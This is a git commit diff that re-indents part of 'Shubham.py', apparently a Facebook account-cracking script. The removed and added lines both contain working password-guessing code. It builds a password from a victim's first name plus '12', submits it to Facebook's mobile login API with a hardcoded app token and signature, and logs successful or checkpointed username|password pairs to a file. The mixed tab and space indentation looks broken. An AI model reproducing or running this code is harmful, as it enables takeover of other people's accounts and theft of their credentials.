69b3139a04ffccf811881d25e5230e5d689f1874
sHuBhAm_G0sAiN <63947251+ShuBhamg0sain@users.noreply.github.com>
2020-10-26 18:37:03 +0530

    Update Shubham.py

--- Shubham.py
+++ Shubham.py
@@ -487,16 +487,16 @@ def pilih_super():
 					                                                                                cek.write(user+"|"+pass6+"\n")
 					                                                                                cek.close() 
 					                                                                                cekpoint.append(user+pass6)
-                                  else:
-                                        pass7 = b['first_name']+'12'
-			                data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-			                q = json.load(data)
-			                if 'access_token' in q:
-				                print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass7 + ' - ' + b['name']
-				                oks.append(user+pass7)
-			                else:
-				                if 'www.facebook.com' in q["error_msg"]:
-					                print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass7 + ' - ' + b['name']
+                                                                                                                else:
+                                                                                                                        pass7 = b['first_name']+'12'
+			                                                                                                data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+			                                                                                                q = json.load(data)
+			                                                                                                if 'access_token' in q:
+				                                                                                                print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass7 + ' - ' + b['name']
+                                                                                  				                oks.append(user+pass7)
+                                                                                        			        else:
+                                                                                   				                if 'www.facebook.com' in q["error_msg"]:
+                                                                                     					                print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass7 + ' - ' + b['name']
 					                cek = open("sg/ok_cp.txt", "a")
 					                cek.write(user+"|"+pass7+"\n")
 					                cek.close()
